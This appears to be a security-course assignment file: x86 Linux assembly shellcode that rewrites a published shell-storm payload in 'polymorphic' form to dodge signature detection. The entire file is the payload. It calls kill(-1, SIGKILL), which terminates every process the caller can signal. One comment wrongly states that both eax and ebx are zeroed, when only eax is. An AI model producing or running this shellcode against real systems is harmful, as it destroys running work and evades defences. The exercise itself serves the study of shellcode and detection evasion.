;#SLAE Assignment #06: Polymorphism
;#Polymorphic Version of hellcode from: http://shell-storm.org/shellcode/files/shellcode-212.php
;#AUTHOR: SLAE-1262

section .text
global _start

_start: ;Polymorphic Version    
	mov eax,ebx	;for cross-xor
	xor eax,ebx	;eax=ebx=0
	dec ebx		;ebx=-1 -> ebx finished

	mov al,10	;prepare for add
	add eax,ebx	;eax=9
	mov ecx,eax	;ecx=9 -> ebx finished

	add al,28	;eax=37 -> eax finished

	int 0x80	;fire syscall	
